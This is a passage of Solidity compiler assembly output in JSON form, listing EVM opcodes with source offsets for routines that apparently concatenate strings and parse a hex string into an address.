											"source": 0,
											"value": "1DDAE"
										},
										{
											"begin": 14491,
											"end": 14518,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14491,
											"end": 14518,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14532,
											"end": 14555,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 14558,
											"end": 14610,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "64"
										},
										{
											"begin": 14566,
											"end": 14580,
											"name": "DUP10",
											"source": 0
										},
										{
											"begin": 14582,
											"end": 14609,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "65"
										},
										{
											"begin": 14597,
											"end": 14608,
											"name": "DUP11",
											"source": 0
										},
										{
											"begin": 14582,
											"end": 14596,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "56"
										},
										{
											"begin": 14582,
											"end": 14609,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14582,
											"end": 14609,
											"name": "tag",
											"source": 0,
											"value": "65"
										},
										{
											"begin": 14582,
											"end": 14609,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14558,
											"end": 14565,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 14558,
											"end": 14610,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14558,
											"end": 14610,
											"name": "tag",
											"source": 0,
											"value": "64"
										},
										{
											"begin": 14558,
											"end": 14610,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14532,
											"end": 14610,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14532,
											"end": 14610,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14621,
											"end": 14644,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 14647,
											"end": 14716,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "66"
										},
										{
											"begin": 14655,
											"end": 14685,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "67"
										},
										{
											"begin": 14670,
											"end": 14684,
											"name": "DUP10",
											"source": 0
										},
										{
											"begin": 14655,
											"end": 14669,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "56"
										},
										{
											"begin": 14655,
											"end": 14685,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14655,
											"end": 14685,
											"name": "tag",
											"source": 0,
											"value": "67"
										},
										{
											"begin": 14655,
											"end": 14685,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14687,
											"end": 14715,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "68"
										},
										{
											"begin": 14702,
											"end": 14714,
											"name": "DUP10",
											"source": 0
										},
										{
											"begin": 14687,
											"end": 14701,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "56"
										},
										{
											"begin": 14687,
											"end": 14715,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14687,
											"end": 14715,
											"name": "tag",
											"source": 0,
											"value": "68"
										},
										{
											"begin": 14687,
											"end": 14715,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14647,
											"end": 14654,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 14647,
											"end": 14716,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14647,
											"end": 14716,
											"name": "tag",
											"source": 0,
											"value": "66"
										},
										{
											"begin": 14647,
											"end": 14716,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14621,
											"end": 14716,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14621,
											"end": 14716,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14727,
											"end": 14750,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 14753,
											"end": 14823,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "69"
										},
										{
											"begin": 14761,
											"end": 14791,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "70"
										},
										{
											"begin": 14776,
											"end": 14790,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 14761,
											"end": 14775,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "56"
										},
										{
											"begin": 14761,
											"end": 14791,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14761,
											"end": 14791,
											"name": "tag",
											"source": 0,
											"value": "70"
										},
										{
											"begin": 14761,
											"end": 14791,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14793,
											"end": 14822,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "71"
										},
										{
											"begin": 14808,
											"end": 14821,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 14793,
											"end": 14807,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "56"
										},
										{
											"begin": 14793,
											"end": 14822,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14793,
											"end": 14822,
											"name": "tag",
											"source": 0,
											"value": "71"
										},
										{
											"begin": 14793,
											"end": 14822,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14753,
											"end": 14760,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 14753,
											"end": 14823,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14753,
											"end": 14823,
											"name": "tag",
											"source": 0,
											"value": "69"
										},
										{
											"begin": 14753,
											"end": 14823,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14727,
											"end": 14823,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14727,
											"end": 14823,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14857,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 14860,
											"end": 14929,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "72"
										},
										{
											"begin": 14868,
											"end": 14897,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "73"
										},
										{
											"begin": 14883,
											"end": 14896,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 14868,
											"end": 14882,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "56"
										},
										{
											"begin": 14868,
											"end": 14897,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14868,
											"end": 14897,
											"name": "tag",
											"source": 0,
											"value": "73"
										},
										{
											"begin": 14868,
											"end": 14897,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14899,
											"end": 14928,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "74"
										},
										{
											"begin": 14914,
											"end": 14927,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 14899,
											"end": 14913,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "56"
										},
										{
											"begin": 14899,
											"end": 14928,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14899,
											"end": 14928,
											"name": "tag",
											"source": 0,
											"value": "74"
										},
										{
											"begin": 14899,
											"end": 14928,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14860,
											"end": 14867,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 14860,
											"end": 14929,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14860,
											"end": 14929,
											"name": "tag",
											"source": 0,
											"value": "72"
										},
										{
											"begin": 14860,
											"end": 14929,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14929,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14929,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14943,
											"end": 14969,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 14972,
											"end": 15041,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "75"
										},
										{
											"begin": 14980,
											"end": 15009,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "76"
										},
										{
											"begin": 14988,
											"end": 14997,
											"name": "DUP7",
											"source": 0
										},
										{
											"begin": 14999,
											"end": 15008,
											"name": "DUP7",
											"source": 0
										},
										{
											"begin": 14980,
											"end": 14987,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 14980,
											"end": 15009,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14980,
											"end": 15009,
											"name": "tag",
											"source": 0,
											"value": "76"
										},
										{
											"begin": 14980,
											"end": 15009,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 15011,
											"end": 15040,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "77"
										},
										{
											"begin": 15019,
											"end": 15028,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 15030,
											"end": 15039,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 15011,
											"end": 15018,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 15011,
											"end": 15040,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 15011,
											"end": 15040,
											"name": "tag",
											"source": 0,
											"value": "77"
										},
										{
											"begin": 15011,
											"end": 15040,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14972,
											"end": 14979,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 14972,
											"end": 15041,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14972,
											"end": 15041,
											"name": "tag",
											"source": 0,
											"value": "75"
										},
										{
											"begin": 14972,
											"end": 15041,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14943,
											"end": 15041,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14943,
											"end": 15041,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15052,
											"end": 15078,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 15081,
											"end": 15107,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "78"
										},
										{
											"begin": 15081,
											"end": 15107,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 15081,
											"end": 15107,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 15081,
											"end": 15107,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 15081,
											"end": 15107,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 15081,
											"end": 15107,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 15081,
											"end": 15107,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 15081,
											"end": 15107,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 15081,
											"end": 15107,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 15081,
											"end": 15107,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 15081,
											"end": 15107,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 15081,
											"end": 15107,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 15081,
											"end": 15107,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 15081,
											"end": 15107,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 15081,
											"end": 15107,
											"name": "PUSH",
											"source": 0,
											"value": "3000000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 15081,
											"end": 15107,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 15081,
											"end": 15107,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 15081,
											"end": 15107,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15094,
											"end": 15106,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 15081,
											"end": 15088,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 15081,
											"end": 15107,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 15081,
											"end": 15107,
											"name": "tag",
											"source": 0,
											"value": "78"
										},
										{
											"begin": 15081,
											"end": 15107,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 15052,
											"end": 15107,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 15052,
											"end": 15107,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15128,
											"end": 15140,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 15121,
											"end": 15140,
											"name": "SWAP15",
											"source": 0
										},
										{
											"begin": 15121,
											"end": 15140,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15121,
											"end": 15140,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15121,
											"end": 15140,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15121,
											"end": 15140,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15121,
											"end": 15140,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15121,
											"end": 15140,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15121,
											"end": 15140,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15121,
											"end": 15140,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15121,
											"end": 15140,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15121,
											"end": 15140,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15121,
											"end": 15140,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15121,
											"end": 15140,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15121,
											"end": 15140,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15121,
											"end": 15140,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15121,
											"end": 15140,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14068,
											"end": 15158,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14068,
											"end": 15158,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 8633,
											"end": 9573,
											"name": "tag",
											"source": 0,
											"value": "47"
										},
										{
											"begin": 8633,
											"end": 9573,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8699,
											"end": 8714,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 8727,
											"end": 8743,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 8752,
											"end": 8754,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 8727,
											"end": 8755,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8727,
											"end": 8755,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8766,
											"end": 8779,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 8782,
											"end": 8783,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8766,
											"end": 8783,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8766,
											"end": 8783,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8794,
											"end": 8804,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 8815,
											"end": 8825,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8841,
											"end": 8847,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 8850,
											"end": 8851,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 8841,
											"end": 8851,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8841,
											"end": 8851,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8836,
											"end": 9534,
											"name": "tag",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 8836,
											"end": 9534,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8857,
											"end": 8867,
											"name": "PUSH",
											"source": 0,
											"value": "2A"
										},
										{
											"begin": 8853,
											"end": 8854,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8853,
											"end": 8867,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 8836,
											"end": 9534,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8836,
											"end": 9534,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "81"
										},
										{
											"begin": 8836,
											"end": 9534,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8901,
											"end": 8904,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 8892,
											"end": 8904,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 8892,
											"end": 8904,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 8892,
											"end": 8904,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 8892,
											"end": 8904,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8938,
											"end": 8941,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 8942,
											"end": 8943,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8938,
											"end": 8944,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8938,
											"end": 8944,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8938,
											"end": 8944,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8938,
											"end": 8944,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 8938,
											"end": 8944,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "83"
										},
										{
											"begin": 8938,
											"end": 8944,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8938,
											"end": 8944,
											"name": "INVALID",
											"source": 0
										},
										{
											"begin": 8938,
											"end": 8944,
											"name": "tag",
											"source": 0,
											"value": "83"
										},
										{
											"begin": 8938,
											"end": 8944,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8938,
											"end": 8944,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 8938,
											"end": 8944,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8938,
											"end": 8944,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8938,
											"end": 8944,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8938,
											"end": 8944,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 8938,
											"end": 8944,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 8938,
											"end": 8944,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 8938,
											"end": 8944,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 8932,
											"end": 8945,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 8932,
											"end": 8945,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 8924,
											"end": 8946,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 8924,
											"end": 8946,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8919,
											"end": 8946,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 8919,
											"end": 8946,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8980,
											"end": 8983,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 8988,
											"end": 8989,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 8984,
											"end": 8985,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 8984,
											"end": 8989,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8980,
											"end": 8990,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8980,
											"end": 8990,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8980,
											"end": 8990,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8980,
											"end": 8990,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 8980,
											"end": 8990,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "84"
										},
										{
											"begin": 8980,
											"end": 8990,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8980,
											"end": 8990,
											"name": "INVALID",
											"source": 0
										},
										{
											"begin": 8980,
											"end": 8990,
											"name": "tag",
											"source": 0,
											"value": "84"
										},
										{
											"begin": 8980,
											"end": 8990,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8980,
											"end": 8990,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 8980,
											"end": 8990,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8980,
											"end": 8990,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8980,
											"end": 8990,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8980,
											"end": 8990,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 8980,
											"end": 8990,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 8980,
											"end": 8990,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 8980,
											"end": 8990,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 8974,
											"end": 8991,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 8974,
											"end": 8991,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 8966,
											"end": 8992,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 8966,
											"end": 8992,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8961,
											"end": 8992,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8961,
											"end": 8992,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9018,
											"end": 9020,
											"name": "PUSH",
											"source": 0,
											"value": "61"
										},
										{
											"begin": 9012,
											"end": 9014,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 9012,
											"end": 9020,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9012,
											"end": 9020,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 9012,
											"end": 9020,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 9012,
											"end": 9020,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9011,
											"end": 9036,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 9011,
											"end": 9036,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9011,
											"end": 9036,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "85"
										},
										{
											"begin": 9011,
											"end": 9036,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9011,
											"end": 9036,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9032,
											"end": 9035,
											"name": "PUSH",
											"source": 0,
											"value": "66"
										},
										{
											"begin": 9026,
											"end": 9028,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 9026,
											"end": 9035,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9026,
											"end": 9035,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 9026,
											"end": 9035,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 9026,
											"end": 9035,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9011,
											"end": 9036,
											"name": "tag",
											"source": 0,
											"value": "85"
										},
										{
											"begin": 9011,
											"end": 9036,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9007,
											"end": 9239,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9007,
											"end": 9239,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "86"
										},
										{
											"begin": 9007,
											"end": 9239,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9063,
											"end": 9065,
											"name": "PUSH",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 9057,
											"end": 9065,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 9057,
											"end": 9065,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 9057,
											"end": 9065,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 9057,
											"end": 9065,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9007,
											"end": 9239,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "87"
										},
										{
											"begin": 9007,
											"end": 9239,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 9007,
											"end": 9239,
											"name": "tag",
											"source": 0,
											"value": "86"
										},
										{
											"begin": 9007,
											"end": 9239,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9098,
											"end": 9100,
											"name": "PUSH",
											"source": 0,
											"value": "41"
										},
										{
											"begin": 9092,
											"end": 9094,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 9092,
											"end": 9100,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9092,
											"end": 9100,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 9092,
											"end": 9100,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 9092,
											"end": 9100,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9091,
											"end": 9115,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 9091,
											"end": 9115,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9091,
											"end": 9115,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "88"
										},
										{
											"begin": 9091,
											"end": 9115,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9091,
											"end": 9115,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9112,
											"end": 9114,
											"name": "PUSH",
											"source": 0,
											"value": "46"
										},
										{
											"begin": 9106,
											"end": 9108,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 9106,
											"end": 9114,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9106,
											"end": 9114,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 9106,
											"end": 9114,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 9106,
											"end": 9114,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9091,
											"end": 9115,
											"name": "tag",
											"source": 0,
											"value": "88"
										},
										{
											"begin": 9091,
											"end": 9115,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9087,
											"end": 9239,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9087,
											"end": 9239,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "89"
										},
										{
											"begin": 9087,
											"end": 9239,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9142,
											"end": 9144,
											"name": "PUSH",
											"source": 0,
											"value": "37"
										},
										{
											"begin": 9136,
											"end": 9144,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 9136,
											"end": 9144,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 9136,
											"end": 9144,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 9136,
											"end": 9144,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9087,
											"end": 9239,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "90"
										},
										{
											"begin": 9087,
											"end": 9239,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 9087,
											"end": 9239,
											"name": "tag",
											"source": 0,
											"value": "89"
										},
										{
											"begin": 9087,
											"end": 9239,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9177,
											"end": 9179,
											"name": "PUSH",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 9171,
											"end": 9173,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 9171,
											"end": 9179,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9171,
											"end": 9179,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 9171,
											"end": 9179,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 9171,
											"end": 9179,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9170,
											"end": 9194,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 9170,
											"end": 9194,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9170,
											"end": 9194,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "91"
										},
										{
											"begin": 9170,
											"end": 9194,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9170,
											"end": 9194,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9191,
											"end": 9193,
											"name": "PUSH",
											"source": 0,
											"value": "39"
										},
										{
											"begin": 9185,
											"end": 9187,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 9185,
											"end": 9193,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9185,
											"end": 9193,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 9185,
											"end": 9193,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 9185,
											"end": 9193,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9170,
											"end": 9194,
											"name": "tag",
											"source": 0,
											"value": "91"
										},
										{
											"begin": 9170,
											"end": 9194,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9166,
											"end": 9239,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9166,
											"end": 9239,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "92"
										},
										{
											"begin": 9166,
											"end": 9239,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9221,
											"end": 9223,
											"name": "PUSH",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 9215,
											"end": 9223,
											"name": "DUP4",
											"source": 0
										},
										{
